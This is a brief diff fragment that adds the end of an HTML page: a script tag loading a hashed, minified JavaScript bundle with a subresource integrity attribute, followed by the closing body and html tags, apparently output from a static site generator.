+    <script src="http://example.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
